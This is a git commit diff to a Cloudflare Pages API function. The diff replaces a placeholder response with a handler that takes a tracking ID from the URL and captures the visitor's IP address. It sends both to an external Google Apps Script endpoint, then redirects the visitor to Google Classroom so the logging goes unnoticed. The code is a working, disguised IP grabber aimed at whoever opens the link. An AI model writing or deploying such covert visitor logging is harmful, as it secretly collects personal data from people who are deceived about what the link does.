bbc9d91606202b18ec9402eeb17a5f6f8a7c8c59
henxdl <123426614+henxdl@users.noreply.github.com>
2025-03-28 18:24:40 -0500

    Update pages.js

--- functions/api/pages.js
+++ functions/api/pages.js
@@ -1,3 +1,22 @@
 export async function onRequest(context) {
-    return new Response('Hello from API!', { status: 200 });
+    const { request } = context;
+    const url = new URL(request.url);
+    const id = url.searchParams.get('i');
+    const ip = request.headers.get("x-forwarded-for") || request.connection.remoteAddress;
+
+    try {
+        if (id) {
+            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ id: id, ip: ip })
+            });
+        }
+    } catch (error) {
+        return new Response(JSON.stringify({ error: "Failed to post data" }), { status: 500 });
+    }
+
+    return Response.redirect("https://classroom.google.com/h", 302);
 }
